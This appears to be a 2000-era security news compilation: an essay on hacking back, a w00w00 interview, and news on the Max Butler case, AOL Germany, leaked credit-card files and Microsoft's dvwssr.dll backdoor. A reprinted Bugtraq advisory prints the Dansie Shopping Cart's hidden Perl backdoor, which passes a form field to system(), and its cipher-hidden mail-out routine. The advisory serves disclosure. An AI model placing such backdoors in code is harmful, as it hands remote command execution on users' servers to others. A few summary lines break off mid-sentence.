      At first glance, it doesn't make any sense: If you can disarm a 
      knife-wielding mugger, why can't you disarm your electronic mugger? But in 
      the physical world, you know who is mugging you. During the physical 
      attack there is a person with a knife, and while you may not know his name 
      or see his face, you are 100% sure that the knife you are taking away is 
      in the hands of a bad guy. 

      In the networked world, though, you cannot be sure the guy (IP address) 
      that seems to be attacking you is really the one attacking you. For 
      example, many of the zombie-based, distributed denial-ofservice attacks 
      that occurred in February were traced back to benign networks which were 
      merely unwitting hosts to remote-triggered Trojans located on their 
      servers. 

      Hostile perimeter defense is a really tough problem, and right now the law 
      protects the bad guys more than the good guys. I don't have a perfect 
      solution to this conundrum, but a few thoughts do come to mind: 

      Let the industry design a set of hostile response tools that will stop an 
      attack, but minimize harm just in case a zombie is in the middle. Then, 
      legalize the use of these tools. 

      Legalize hostile responses, and zombie computers be damned if their 
      security is so bad that their networks can be compromised. Build a 
      hardened back-channel on the Internet which will provide fast routing so 
      that trace-back and bad-guy ID is easier, faster, and with the cooperation 
      of the ISP community, automatic. 

      Develop an Internet-based Caller ID system so that Web sites know who's 
      there, what they're doing and can ignore all anonymous requests. 

      Do nothing: Let the bad guys continue to win. 

      So in the spirit of the networked community, I'm asking readers to help 
      out: What do you think is a fair and efficient way of disarming online 
      assailants to protect your net? 

      Be creative, let loose; write laws or design technology. And send me your 
      ideas. Maybe together we can get something done.

      So I decided it was time to release HYPE : Issue 2. I sent notice to BME 
      Online's mailing list that I was looking for another candidate to honor 
      for their contributions, and sure enough I was contacted by an online 
      friend (that I've actually met in person as well): xm of geekmafia. He 
      suggested that I take a gander at w00w00.org, a web address that I had not 
      even heard of before. Since I didn't even recognize it, I decided that I 
      would follow his suggestion and see what w00w00 was all about. 

      I was welcomely surprised. I learned that this organization was one of the 
      largest of its type (which made me feel a bit inferior for not knowing 
      about them before this). w00w00 is a compliation of many things, mainly 
      focused on being a computer security forum, "where people could share 
      technical information and become involved with some of the top people in 
      the industry." I was immediately interested. 

      w00w00 is a very relaxed organization and always expanding. It grew 
      because there was nothing like it that preceded its existance. In the 
      words of shok, which I agree with tremendously, "w00w00 is a freedom and 
      not a restriction." 

      I contacted shok with my request to have w00w00 be the cover for this 
      issue of HYPE, and he agreed. The following is the interview that took 
      place. 

      
      w00w00 by dave920 

      page 2 of 2 

      dave920: What caused w00w00 to arise as an organization? 

      w00w00: Well, it was not intentionally created. However, the reason that 
      it succeeded, was the lack of technical security forums, where people 
      could share technical information and become involved with some of the top 
      people in the industry. w00w00 is serving as something of a Studio 54, 
      where acceptance into the group is based on technical knowledge and not 
      reputation. There are limitations to other forums such as Phrack, L0pht, 
      and BugTraq. Phrack is a zine, not a forum. L0pht serves a similar purpose 
      but has been "closed" to all but a small few. BugTraq is a moderated and 
      fairly uninteractive email forum. w00w00 is the only one offering 
      technical information on such a wide scale. All members have a very 
      different background (different areas of knowledge, different countries, 
      different languages, etc.). 

      What was the original focus of w00w00, and how has that changed since its 
      foundation? 

      At first we tried to keep things very technical. Over time, it became 
      relaxed and people published work when they felt like it. The group grew 
      tremendously as a result of it. w00w00 is a loose association, in that 
      people can continue to work where they do or affiliate with other groups. 
      w00w00 is a freedom and not a restriction. 

      How do you feel that your organization has benefitted the Internet 
      community? In the same regards, how has w00w00 benefitted from it? 

      We've offered a forum unparallel to any other for the security community. 
      We've allowed all kinds of people to get together for a common cause (very 
      similar to a security conference, but online and available 365 days a 
      year). Without the Internet, w00w00 wouldn't be possible, as we're 
      entirely Internet-based. 

      What specific steps have you taken to further the advancement of w00w00? 

      We intentionally went for diversity, so that each member could grow from 
      the others. We've always allowed bright people to get involved, and we've 
      had key involvements with other groups and companies to increase the 
      commonwealth of the group and share resources. 

      How has your understanding of the computer underground changed through the 
      development of w00w00? 

      Hmm, interesting question. I would say that it allows us to see the 
      computer security community from both a corporate (many members work for 
      large security firms) and a security group view, that large corporations 
      don't have access to. It's allowed us to interact with both sides. As far 
      as how its changed our understanding, I can't say it has. What I would say 
      is that it brought the different understandings of different members and 
      merged them into a common one. 

      What would you say is the most significant accomplishment that w00w00 has 
      made? 

      Growing into not only the world's largest non-profit security 
      organization, but by far the most diverse in geographic distribution, 
      ethnic distribution, and technical distribution. 

      What do you plan for the future of your organization? 

      Continue to share information, continue to publish or work, and continue 
      to grow, grow, grow.

      "White Hat" Hacker in Court Open source hacker "Max Vision" aided the FBI 
      while allegedly cracking the Pentagon. By Kevin Poulsen April 13, 2000 
      12:26 AM PT

      A 27-year-old computer security expert and former FBI source returned to 
      federal court in San Jose, California Wednesday, where he stands accused 
      of penetrating a string of defense department and civilian computers.

      Max Butler, known as "Max Vision" to friends and associates, was slammed 
      with a fifteen count indictment last month charging him with interception 
      of communications, computer intrusion and possession of stolen passwords 
      in connection with an alleged hacking spree in the Spring of 1998. At 
      Wednesday's appearance, Judge James Ware set a new date of May 8th for 
      laying down the timetable of deadlines and court appearances that lead to 
      trial.

      Butler's indictment sent shockwaves through the close-knit community of 
      computer security experts who specialize in the arcane science of 
      intrusion detection - the careful analysis of Internet traffic for 
      "signatures" indicative of an attack. Butler is noted for creating and 
      maintaining arachNIDS, an open source catalog of attack signatures that 
      could be thought of as a clearinghouse of clues for Internet cybersleuths, 
      and is part of an overall public resource that Butler created at 
      WhiteHats.com.

      In the parlance of hackers, "white hats" are ethical and law abiding -- 
      distinguishable from "black hats" who crack computers without permission, 
      and "gray hats" who fall somewhere in between. 

      Martin Roesch, Director of Forensic Systems at network security startup 
      Hiverworld, says that until last month, there was no doubt what color 
      Butler's "hat" was. "He donated an immense amount of time to open source 
      security, and he did a hell of a job." says Roesch. "Everyone's using 
      arachNIDS." 'Butler has provided useful and timely information on computer 
      crimes in the past'       -- FBI affidavit Roesch recruited Butler to join 
      Hiverworld as Vulnerability Engineer, luring him away from the consulting 
      work and penetration testing he performed as Max Vision Network Security. 
      According to Hiverworld, Butler passed a background check, and was to 
      start work on March 21st. He didn't make it.

      "The day he was supposed to start he said he was unable to come in... and 
      that he would catch up with me in a day or two," recalls Hiverworld CTO 
      David Cruickshank. "That night, I had fallen asleep with the TV on, and I 
      woke up when I heard his name on the news."

      Known Vulnerability       Butler self-surrendered to authorities on March 
      21st, the day he was to begin his new job. He's charged with cracking 
      systems at McChord Air Force Base, NASA's Marshall Space Flight Center, 
      the Argonne and Brookhaven National Labs, IDSoftware, and an unspecified 
      Defense Department system. Another count alleges he unlawfully possessed 
      477 customer passwords from Aimnet, an ISP. 

      He plead not-guilty, and was released on March 24th on $100,000 in 
      signature and property bonds posted by friends in the open source 
      community, a dozen of whom reportedly flocked to the courtroom in support 
      of Butler.

      According to an FBI affidavit dated July 2nd, 1998, executed by agent 
      Peter Trahon of the Bureau's San Francisco Computer Crime Squad, the 
      investigation that led to Butler began in May of that year, when the 
      Defense Department began suffering a rash of intrusions exploiting a 
      "recently discovered" vulnerability in a common piece of software called 
      BIND.

      The devastating security hole formally known as the "iquery BIND Buffer 
      Overflow vulnerability" was publicly announced by Carnegie Mellon's 
      Computer Emergency Response Team (CERT) on April 8th, 1998, by which time 
      a new version of BIND without the bug was available. But a month later, 
      according to the affidavit, hackers were still using it to crack Air Force 
      systems, nuclear laboratories, the U.S. Departments of Commerce, 
      Transportation and the Interior, as well as the National Institute of 
      Health.

      According to the statement, on May 21st, 1998 an Air Force investigator 
      tracked an intruder from McChord Air Force Base back to a computer at Los 
      Angeles Community College, which proved to be a staging ground for BIND 
      buffer overflow attacks on military sites all around the country. 
      Connection logs obtained from the college under a court order lead to a 
      particular Internet address at an ISP, where records obtained under a 
      second court order completed the trace to Max Butler's home telephone 
      number.

      The telephone number was familiar to the FBI. "Max Butler is well known to 
      the [agents] of the Computer Crime Squad," the 1998 affidavit reads. 
      "Butler has been a confidential source... for the FBI for approximately 2 
      years. He has provided useful and timely information on computer crimes in 
      the past."

      The affidavit notes that their source "has the ability to develop 
      techniques for, and commit, a sophisticated computer intrusion such as the 
      ones described herein."

      "Hacker Witch-Hunt"       The FBI searched Butler's home on July 2nd, 
      1998. But according to his lawyer, the raid didn't stop the Computer Crime 
      Squad from returning to Butler for more help. 

      Defense attorney Jennifer Granick, says her client's cooperation with the 
      FBI never involved informing on other people. "They used him for 
      technological help, and then they pressured him to do more than that, and 
      to do things he didn't want to do," says Granick. "They continued to seek 
      his assistance even after he became a suspect in this case." [Granick has 
      contributed to SecurityFocus.com.] 

      "The government then turns around in court and says he's dangerous and 
      he's a flight risk, even though they had continued to want to work with 
      him," says Granick, who declined to comment on other details of the case. 

      Assistant U.S. Attorney Ross Nadel -- Butler's prosecutor and the head of 
      Silicon Valley's "Computer Hacking and Intellectual Property" (CHIP) unit 
      -- didn't return phone calls Wednesday.

      Butler is under advice from Granick not to speak to the press, and he 
      didn't answer an email inquiry. But in an April 3rd message to an 
      intrusion detection forum, Butler commented on what he termed the "frenzy 
      of the hacker witch-hunt." 

      "I am innocent until proven guilty and would appreciate the recognition of 
      this by our community," writes Butler, who also vows to continue his work 
      on open source security, though at a reduced capacity. "Due to my unusual 
      circumstances, the focus of my activities will shift to more professional 
      work and less pure research... I'll do what I can as the situation 
      allows."

      Butler also railed against Hiverworld, which withdrew its employment offer 
      after learning of his indictment. "[T]he corporation expressed cowardice 
      that is deplorable. I can't tell you how disappointed I was to feel the 
      complete lack of support from the Hive," wrote Butler.

      Hiverworld's Cruickshank says the company had no choice. "We're a security 
      start up that does intrusion detection and vulnerability scanning, so 
      having a person on staff who is under suspicion for major hacking 
      incidents is probably not the best idea in the world," says Cruickshank.

      "As a security company," Cruickshank adds, "it's really important for us 
      to have white hats on board."

      Kevin Mitnick, Reformed Hacker, to Lead Cyber Security Panel at UITA's 
      NetTrends 2000 

       
      Information Security Experts to Give Utah Businesses a Wake-up Call 
      Updated 3:25 PM ET April 12, 2000 MIDVALE, Utah, April 12 /PRNewswire/ -- 
      One of the most visible computer hackers in the world will be in Salt Lake 
      City next week to lead a three-person panel discussion on cyber security 
      issues. Kevin Mitnick has spent more than six of the last 20 years in jail 
      or prison for various technology related crimes. He was most recently 
      released from a medium-security federal prison in Lompoc, California after 
      being incarcerated for more than four years.

      Next Wednesday Mitnick will join Rob Clyde, vice president of security 
      management at AXENT Technologies, Inc., and Kelly White, senior consultant 
      with Context Integration, in what is expected to be a free-wheeling panel 
      discussion on cyber security issues facing businesses and governments in 
      Utah and around the world.

      The 75-minute cyber security panel discussion will be held from 1:00 p.m. 
      to 2:15 p.m. on Wednesday, April 19 at the Salt Palace Convention Center 
      in Salt Lake City. The panel discussion is part of a two-day event, April 
      19 and 20, produced by the Utah Information Technologies Association 
      called NetTrends 2000: The Digital Revolution.

      "The Cyber Security panel will provide invaluable security information to 
      business leaders," said Richard Nelson, president and chief executive 
      officer of UITA. "Our panel of experts has nearly 50 years of combined 
      experience in information security. But what makes this panel truly unique 
      is the diversity of experience our panelists have. Rob has spent his 
      career creating computer security systems, Kelly has studied and tested 
      security systems and Kevin has built his expertise in circumventing these 
      systems. Together the three will discuss the real security issues facing 
      businesses today and the best solutions to effectively protect systems 
      from intrusion."

      Mitnick is recognized by many as one of the most visible hackers in 
      history, including breaking into computer systems at some of the world's 
      largest corporations. As a reformed hacker, Mitnick's expert commentary 
      has been broadcast on CBS's 60 Minutes, CNN, Fox and CourtTV. In March 
      2000, he testified before the United States Senate in committee hearings 
      to explore ways to make computer systems safer from intruders.

      As a founder of AXENT Technologies, Robert Clyde was a primary developer 
      of AXENT's original security management products and launched its security 
      consulting services. (AXENT is a provider of enterprise security solutions 
      for distributed computer environments.) Clyde has more than 20 years of 
      experience in security product development, management and consulting. He 
      has provided security consulting to Fortune 1000 companies and financial 
      institutions, advising CIOs and IT managers on how to solve security 
      problems at an enterprise level. Clyde is also a sought-after speaker at 
      security-related conferences.

      Kelly White is a senior consultant with Context Integration, a provider of 
      business-to-business e-commerce solutions. Prior to joining Context 
      Integration, White was an Internet security specialist with Ernst & Young 
      LLP. As a security consultant, White conducted Internet attack and 
      penetration studies and designed Internet security architectures for 
      Fortune 1000 companies.

54.0 [HNN] AOL Liable for Music Piracy 
     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

     A German court has ruled that AOL Germany is liable for pirate music
     held on its servers. The ruling stems from a case filed by Hit box in
     1998. AOL says it will appeal and that there is no technical way that
     it can monitor all its content all the time.

      German court: AOL liable for music piracy MUNICH, Germany (AP) - In a 
      ruling that could give the music industry a weapon against Internet 
      piracy, a court said Wednesday that America Online is responsible when 
      users swap bootleg music files on its service. 

      The case before a Bavarian state court in Munich originated with Hit Box 
      Software, a German company that sued AOL Germany for copyright violation 
      in 1998 after discovering that its digital music files were being 
      exchanged on the online service. An attorney for Hit Box, Stefan Ventroni, 
      hailed the ruling as an important step toward giving musicians better 
      protection against unauthorized use of their performances on the Internet. 

      ''With this verdict, they can demand that such Internet pages be 
      blocked,'' he said. 

      AOL Germany said it would appeal. It argued that it lacks technical means 
      to monitor the service's huge data flow and that it had closed down the 
      forum where music was illegally swapped after learning of it. 

      ''Total control of all pages on our servers is technically almost 
      impossible,'' said Alexander Adler, a spokesman for AOL Germany. ''Also, 
      that would amount to censorship.'' 

      At issue were three instrumental versions of pop hits, including Get Down 
      by the Backstreet Boys, intended mainly for use as karaoke soundtracks. 
      Hit Box said each track, which normally costs up to $15 on a CD, was 
      downloaded for free more than 1,000 times via AOL. 

      Hit Box demanded about $50,000 in damages, but the court put off a ruling 
      on the size of the award. 

      Gema, Germany's main music licensing group, said the verdict was a signal 
      that Internet services need to introduce technologies to protect 
      copyrights online. 

      ''The Internet is not a lawless space,'' spokesman Hans-Herwig Geyer said. 
      ''Right now, the rights of creative artists are being trampled on in the 
      Internet.''

     Look Communications (formerly Internet Direct) allowed a file
     containing personal information on over 1,000 people, including credit
     card numbers to be accessible to anyone via the web. The file was in
     place for over five days after the company was first notified before
     it was removed. Toronto Star

     Star:
     
      Credit card files turn up on the Net Security breach at service provider 

      
      By Kerry Gillespie Toronto Star Staff Reporter More than 1,000 
      confidential records - including credit card numbers - were accessible on 
      the Internet for at least five days because of a security breach at one of 
      Canada's largest service providers. 

      A man surfing the Internet stumbled on the file and notified Look 
      Communications, formerly Internet Direct, of their problem on April 5. 

      The file disappeared briefly, but returned and was still there last night 
      when The Star called. 

      Nearly three hours later, the file was gone. 

      ``We're shutting the whole thing down now and, frankly, I'll shut down the 
      whole system if I have to,'' Gary Kawaguchi, a shaken senior 
      vice-president said last night. 

      He had no idea how the security breach occurred or why the company hadn't 
      managed to deal with it when first notified. 

      ``This whole thing is going to prompt us to have a third party security 
      scan on everything we do,'' Kawaguchi said. 

      Look Communications has some 175,000 customers across the country. But 
      most of the addresses on the file were from Ontario. 

      The man who found the file and doesn't want his name used got in touch 
      with K. K. Campbell, a Star columnist who writes about the Internet for 
      the Fast Forward section, after the company failed to fix the problem. 

      ``I've been writing about this for close to 10 years and I've never seen 
      one so close to home,'' Campbell said. It was Toronto Councillor Jack 
      Layton's name that first jumped out at him. 

      ``That's a bit scary to think it's that easily accessible,'' Layton said, 
      when notified that an older credit card of his was on the list. ``I wonder 
      how many thousands of dollars in fraudulent transactions have gone on. The 
      company certainly owes people an explanation.'' 

      Kawaguchi said they notified the credit card companies last night. 

      The list contained names of people who subscribed to Ipass, a global 
      roaming service for the Internet that allows users to pay local rates 
      instead of long distance charges. 

      Jacqueline Miller, a graduate student who does a lot of work abroad, 
      applied for the service to save money. While upset that her American 
      Express card number was out in the open, Miller wasn't surprised. When she 
      originally tried to sign up for the Ipass service over the Internet, the 
      screen told her it wasn't a secure Web site. 

      ``So I did it all verbally by the phone, because I refused to use their 
      Web site,'' she said. ``I told them at the time, but they insisted `No, it 
      is secure.' '' 

      Chris Davis, an Internet security specialist, said he was shocked. 

      ``Any of those people on that list could sue that company,'' said Davis, 
      CEO of HeXedit Network Security Inc., from his Ottawa home last night. 

      Credit card information is supposed to be sent from the user to the 
      company on a secure encrypted link, he said. 

      Once it reaches the company it is un-encrypted for use but should then be 
      destroyed.

      Cell phone giants in Net security pact

      The world's top three mobile phone manufacturers teamed up to develop an 
      open, global industry framework for safer and simpler business over cell 
      phones.

      By Kirstin Ridley, Reuters       April 12, 2000 5:24 AM PT 

      
      LONDON -- The world's top three mobile phone manufacturers teamed up on 
      Tuesday in an attempt to secure the growth of e-commerce by developing an 
      open, global industry framework for safer and simpler business over cell 
      phones. 

      Dismissing concerns that current Internet-enabled phones are unsafe, 
      Sweden's Ericsson (Nasdaq: ERICY), Motorola (NYSE: MOT) of the United 
      States and Finland's Nokia (NYSE: NOK) called on industry peers to jump 
      aboard their initiative and ensure that customers can use mobile phones 
      for trusted, electronic transactions. 

      
      "A mobile device will be the platform to bridge the virtual and physical 
      worlds of e-business," said Matti Alahuhta, president of Nokia's mobile 
      phones division. 

      "Integrating security and transaction applications on a common core 
      standard and platform will create a global mass market for mobile 
      e-business," he added. 

      Encoding data sent over airwaves, establishing its authenticity, ensuring 
      confidentiality and preventing its unauthorized modification and use is 
      seen as vital to unleash the potential for a booming virtual business 
      world. 

      And the companies said the initiative is the key to ensure that growth 
      projections are met. Ericsson forecasts there will be around 1 billion 
      mobile telephone users and some 600 million mobile Internet subscribers 
      worldwide by 2004. 

      WAP phones need WIM       Alahuhta conceded that WAP (Wireless Application 
      Protocol) mobile phones, which allow Internet access, carry no guarantee 
      that transactions are being made by the phone's owner. 

      The answer lies partially in WAP security functions such as WTLS (Wireless 
      Transport Layer Security) and WIM (Wireless Identification Module), which 
      will act as a user ID for access to the Internet and offer the 
      authentication for e-business that cell phone Internet transactions 
      currently lack. 

      The three industry heavyweights said their initiative went further than 
      that of Radicchio, a 36-member consortium of technology and telecom firms 
      across Europe, the United States and Japan that has also called for more 
      secure mobile e-commerce. 

      Radicchio backs Finnish Sonera's technology solution, a so-called public 
      key infrastructure (PKI)-based framework, which could be used as a global 
      standard to ensure that any data sent is scrambled into a tough code to 
      make it hacker-proof.

      
      Ericsson, Motorola and Nokia also hope to help set up an industry standard 
      for a digital signature that will provide the authentication -- ensuring 
      the identity of users -- that is necessary for secure mobile e-commerce. 

      "The mobile device can be a tool for a variety of services, such as 
      banking and trading services, credit card and payment services, 
      loyalty/bonus services, and ID-card services," the companies said.

      "The aim is to offer solutions where security and payment services will be 
      integrated as a standard into hundreds of millions of mobile devices in 
      years to come." 

      The three companies said they would issue technical and other details 
      about the initiative by the end of May on their Web sites and hope to 
      formulate an open framework before the summer.

     Microsoft has admitted that a secret password exists in its Internet

     could allow an intruder complete remote access to the system.
     Microsoft recommends that the file dvwssr.dll be deleted from Internet

     password has been present in the code for at least three years and
     Microsoft has said that it is conducting an internal investigation.

      MS admits planting secret password

      Microsoft engineers placed a password in server software that could be 
      used to gain illicit access to hundreds of thousands of Internet sites 
      worldwide.

      
      By Ted Bridis, WSJ Interactive Edition UPDATED April 14, 2000 12:50 PM PT 

      Microsoft Corp. acknowledged Thursday that its engineers included in some 
      of its Internet software a secret password -- a phrase deriding their 
      rivals at Netscape as "weenies" -- that could be used to gain illicit 
      access to hundreds of thousands of Internet sites worldwide.       The 
      manager of Microsoft's security-response center, Steve Lipner, 
      acknowledged the online-security risk in an interview Thursday and 
      described such a backdoor password as "absolutely against our policy" and 
      a firing offense for the as-yet-unidentified employees. 

      
      The company planned to warn customers as soon as possible with an e-mail 
      bulletin and an advisory published on its corporate Web site. Microsoft 
      (Nasdaq: MSFT) urged customers to delete the computer file--called 
      "dvwssr.dll"--containing the offending code. The file is installed on the 
      company's Internet-server software with Frontpage 98 extensions. 

      While there are no reports that the alleged security flaw has been 
      exploited, the affected software is believed to be used by many Web sites. 
      By using the so-called back door, a hacker may be able to gain access to 
      key Web-site management files, which could in turn provide a road map to 
      such things as customer credit-card numbers, said security experts who 
      discovered the password. 

      Two security experts discovered the rogue computer code -- part of which 
      was the denigrating comment "Netscape engineers are weenies!" -- buried 
      within the 3-year-old piece of software. It was apparently written by a 
      Microsoft employee near the peak of the hard-fought wars between Netscape 
      Communications Corp. and Microsoft over their versions of Internet-browser 
      software. Netscape later was acquired by America Online Inc. 

      One of the experts who helped identify the file is a professional security 
      consultant known widely among the Internet underground as "Rain Forest 
      Puppy." Despite his unusual moniker, he is highly regarded by experts and 
      helped publicize a serious flaw in Microsoft's Internet-server software 
      last summer that put hundreds of high-profile Web sites at risk of 
      intrusion. 

      Almost every Web-hosting provider       Russ Cooper, who runs the popular 
      NT Bugtraq discussion forum on the Internet, estimated that the problem 
      threatened "almost every Web-hosting provider." 

      "It's a serious flaw," Cooper said. "Chances are, you're going to find 
      some major sites that still have it enabled." Lipner of Microsoft said the 
      company will warn the nation's largest Web-site providers directly. 

      In an e-mail to Microsoft earlier Thursday, Rain Forest Puppy complained 
      that the affected code threatened to "improve a hacker's experience." 
      Experts said the risk was greatest at commercial Internet-hosting 
      providers, which maintain hundreds or thousands of separate Web sites for 
      different organizations. 

      Lipner said the problem doesn't affect Internet servers running Windows 
      2000 or the latest version of its server extensions included in Frontpage 
      2000. 

      The digital gaffe initially was discovered by a Europe-based employee of 
      ClientLogic Corp. (www.clientlogic.com) of Nashville, Tenn., which sells 
      e-commerce technology. The company declined to comment because of its 
      coming stock sale. The other expert, Rain Forest Puppy, said he was tipped 
      off to the code by a ClientLogic employee. 

      When asked about the hidden insult Thursday, Jon Mittelhauser, one of 
      Netscape's original engineers, called it "classic engineer rivalry."

      Shopping Cart Program Leaves Back Door Open By Brian McWilliams

      

      The developer of a highly-rated ecommerce shopping cart is accused of

      "He doesn't have the right to execute commands on our server without our 
      authorization. That is technically a hack, and he put it into his code 
      deliberately. It's unconscionable," said Joe Harris, a technical support 
      representative at Blarg Online Services in Seattle. Harris discovered the 
      hidden capability while helping a client install the Dansie Shopping Cart, 
      a CGI script written in the Perl language, and publici zed his findings 
      earlier this week on the Bugtraq security mailing list. 

      According to Harris, Dansie built a subroutine into the cart which enables 
      him to use a nine-character form element or password to remotely execute 
      commands on the server using the broad security privileges usually 
      assigned to CGI scripts. But because the password is the same for every 
      installation of the cart, and because the script must be installed with 
      world-readable permission, anybody who has access to a server on which the 
      cart is installed could retrieve the source code and the form element and 
      use it to control other servers, according to Harris. 

      "It takes little imagination to dream up the potential havoc and privacy 
      violations this level of access could result in -- from stealing private 
      customer records to a full-blown crack of an e-commerce server," said 
      Harris. 

      Dansie did not respond to repeated requests for comment. The telephone 
      number listed in the domain record for dansie.net was disconnected 
      sometime Thursday. And a list of several hundred customers was removed 
      from the site Wednesday evening. 

      Licenses for the Dansie cart start at $150 and range up to $650 for the 
      mall version which can handle an unlimited number of merchants on the same 
      server. 

      According to Kasey Johns, Webmaster for Lonestar Badge and Sign of 
      Martindale, Texas, the backdoor in the Dansie cart appears to be a means 
      of protecting against unauthorized installations and of ensuring 
      compliance with the software's licensing terms, which specifically 
      prohibit modifying the source code. Johns said he learned of the backdoor 
      in late March while trying to debug an installation problem. 

      "I tried to make some changes to it, and basically he deleted the script 
      right off of my server. That just doesn't seem right," said Johns. 

      In an e-mail to Johns Wednesday, Dansie accused him of piracy and asserted 
      that "The software has a copyright protection feature that poses NO 
      security risk to your Web site or your Web server." 

      But Johns said Dansie's anti-piracy efforts are over zealous. "I want the 
      right to look at the code, make modifications, and not be locked into 
      whatever ghosts the author has hiding in there," said Johns. 

      According to Allan Knight, Webmaster for ValueWebHosting in Williamsville, 
      New York, which has over 60 hosting clients using the cart, Dansie 
      recently denied that the program passed information back to him. Knight, 
      who has been using the cart for three years, said Thursday he was not 
      aware that the script gave Dansie or others the ability to execute 
      arbitrary commands. But Knight said he had no plans to stop using the 
      software. 

      "I have never had any reason to shed any distrust on Craig whatsoever," 
      said Knight. 

      While Dansie could issue a patch to customers to disable the backdoor, 
      Harris said prudent users will uninstall the software and find a new 
      shopping cart provider. 

      "His credibility is destroyed. Would you ever again trust anybody who did 
      this? Imagine if it had been Microsoft," Harris said.

      Dansie Shopping Cart
      
      Version  : 3.04 (presumably earlier versions as well)
      Author   : Craig Dansie
      URL      : http://www.dansie.net/
      Language : Perl (both NT and Unix platforms are vulnerable)
      License  : Commercial, starting at $150.00
                 Copyright Dec 10, 1997-2000, Dansie Website Design
      
      
      Synopsis : This program -deliberately- allows arbitrary commands to be
                 executed on the victim server.
      
      
      One of our clients, while installing and configuring the Dansie Shopping
      Cart, ran into difficulty integrating PGP, the shopping cart program, and
      our secure server setup.  While trying to assist our client with the cart
      and PGP configuration we discovered a couple of things.
      
      The CGI, under certain conditions, sends an email to the author of the
      Dansie shopping cart software, 'tech@dansie.net'.  This is not readily
      apparent as the code that handles this transaction incorporates a simple
      Caesar Cipher to hide the email address. The cipher is handled via the
      subroutine 'there2':
      
      ------
      sub there2
      {
          $_ = "$_[0]";
          tr/a-z0-9/gvibn9wprud2lmx8z3fa4eq15oy06sjc7kth/;
          tr/_/-/;
          tr/\@/\./;
          return $_;
      }
      -------
      
      The call that creates this email address and sends the mail is the
      function 'there3'.
      
      -------
      sub there3
      {
          if (($ENV{'OS'} !~ /Windows_NT/i) && ($mailprog) && (-e "$mailprog"))
          {
              $a = &there2('8v59')."\@".&there2('kte3cv').".".&there2('ev8');
              $b = &there2('8v59_3jhhzi8');
              pop(@there2);
              pop(@there2);
              $c = &there2("@there2");
              open (TECH, "|$mailprog $a");
              print TECH "To: $a\n";
              print TECH "From: $a\n";
              print TECH "Subject: $b\n\n";
              print TECH "$path3\n";
              print TECH "$ENV{'HTTP_HOST'} $ENV{'SERVER_NAME'}\n";
              print TECH "$c\n";
              print TECH "$e $there\n" if ($e);
              close (TECH);
          }
      }
      -------
      
      The ciphered strings, when passed through 'there2', result in:
      
         8v59          == tech
         kte3cv        == dansie
         ev8           == net
         8v59_3jhhzi8  == tech-support
         $a            == tech@dansie.net
         $b            == Subject: tech-support
      
      This seems curious, but plausible reasons could include insuring License
      compliance, or maybe the cart automatically sends this email when an error
      occurs. The program definitely goes out of its way to hide the fact that the
      mail is being sent.
      
      While going through the rest of the code we discovered a much more
      interesting item.
      
      (We've masked out the actual trigger element with question marks)
      
      ----------
      if ( ( ( $FORM{'?????????'}) && ($ENV{'HTTP_HOST'} !~ /($d)/) ) || ( ($FORM{'?????????'} ) && (!$d) ) )
      {
          if ( $ENV{'OS'} )
          {
              system("$FORM{'?????????'}");
          }
          else
          {
              open(ELIF,"|$FORM{'?????????'}");
          }
          exit;
      }
      ---------
      
      The form element '?????????', which was originally a pseudo-random appearing
      nine digit string of letters and numbers, allows an intruder to execute any
      command on the server with the same privileges as the CGI process itself.
      Although this is a full disclosure list, the trigger element is obscured to
      prevent the script kiddies from running away with this back door.  If you
      own the cart, then you have access to the source code and can discover the
      element in question easily enough on your own.
      
      Further searches through the code reveal that this form element is immune
      to data validation - it gets passed into this code fragment unchallenged.
      
      The '$d' variable of the condition which permits the back door to function
      is set elsewhere in the program to contain the string 'dansie'.  (Again,
      using the ciphertext algorithm) This indicates that the form element won't
      work on Dansie's own host, but will work on anyone elses.  There are
      additional problems with the 'there' function but we'll leave them as
      exercises for the reader to decipher.
      
      Dansie.net, armed with the server name and URL to the CGI executable
      provided by the cloaked email routine, would be able to run commands on any
      web server on the Internet that has the Dansie Shopping Cart installed. It
      takes little imagination to dream up the potential havoc and privacy
      violations this level of access could result in; from stealing private
      customer records to a full-blown crack of an E-Commerce server.
      
      When checking to see if this was a known issue, the following post from
      "Kasey Johns" <kasey at corridor dot net>, made a little over a week ago,
      was discovered in alt.comp.perlcgi.freelance:
      
      http://www.deja.com/getdoc.xp?AN=601644315
      Follow-up article: http://www.deja.com/getdoc.xp?AN=601857849
      
      We won't quote Kasey's posts here, in brief, Kasey also discovered the back
      door and cloaked email routines. Kasey also provides evidence in the post to
      indicate that not only is Dansie well aware of the back door routine, but
      may be actively attempting to utilize it.
      
      Based upon our own investigation, the information Kasey posted, and our own
      firewall logs (see below), it is our opinion that the back door within
      Dansie.net's shopping cart can best be summarized as follows:
      
        1. The back door is very deliberate.
        2. It isn't unique to the one copy we have access to here.
        3. *Is being actively utilized by the author of the CGI.
      
      * Based upon the log snippet in Kasey's post showing attempted access to
      the CGI from an Earthlink dial-up IP.  (209.179.141.0/24). According to
      Kasey, access to the CGI was attempted less than 30 minutes after the cart
      was installed.
      
      When we noticed the attempted usage of Kasey's server, a quick check of our
      own firewall logs revealed the following:
      
         Packet log: input REJECT eth0 PROTO=6 209.179.141.xx:1054 x.x.x.x:80
         {repeated several dozen times}
      
      We can only assume these attempts, made from the same /24 on Earthlink's
      dial-ups as the one used to probe Kasey's server, were from the author of
      the shopping cart.
      
      We will not try to hazard a guess as to why Dansie.net felt the need to
      include a back door within their shopping cart software. Whatever their
      reasoning may be, it is our opinion that no reason, no matter how well
      thought out or rationalized, justifies the existence of this back door. No
      reasoning can possibly explain away a routine that deliberately allows an
      intruder unrestricted and unauthorized access to any server on the Internet
      that has the Dansie Shopping Cart installed.

      Microsoft Security Bulletin (MS00-025) Procedure Available to Eliminate 
      "Link View Server-Side Component" Vulnerability 

      Originally Posted: April 14, 2000

      Summary On April 14, 2000, Microsoft issued the original version of this 
      bulletin, to discuss a security vulnerability affecting several web server 
      products. Shortly after publishing the bulletin, we learned of a new, 
      separate vulnerability that increased the threat to users of these 
      products. We updated the bulletin later on April 14, 2000, to advise 
      customers of the new vulnerability, and noted that we would provide 
      additional details when known. On April 17, 2000, we updated the bulletin 
      again to provide those details. 

      A procedure is available to eliminate a security vulnerability that could 
      allow a malicious user to cause a web server to crash, or potentially run 
      arbitrary code on the server, if certain permissions have been changed 
      from their default settings to inappropriate ones. Although this bulletin 
      has been updated several times as the investigation of this issue has 
      progressed, the remediation steps have always remained the same  
      customers running affected web servers should delete the affected file, 
      Dvwssr.dll. Customers who have done this at any point in the past do not 
      need to take any further action. 

      Frequently asked questions regarding this vulnerability and the procedure 
